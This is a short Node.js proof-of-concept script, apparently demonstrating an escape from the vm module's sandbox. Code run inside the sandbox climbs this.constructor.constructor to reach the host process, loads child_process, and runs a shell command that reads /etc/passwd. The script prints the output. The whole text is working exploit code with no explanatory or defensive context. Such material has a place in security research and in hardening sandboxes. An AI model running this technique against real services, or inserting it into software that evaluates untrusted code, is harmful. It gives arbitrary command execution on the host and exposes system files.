const vm = require('vm');
const func = `function () { return this.constructor.constructor("return process.mainModule.require('child_process').execSync('cat /etc/passwd',{encoding:'utf-8'})")()}`;
const code = `const func = ${func}; result = func.apply(null, {a:'a'});`;
const context = { obj:'1', result: null};
const script = new vm.Script(code);
script.runInNewContext(context);
console.log(context.result); 
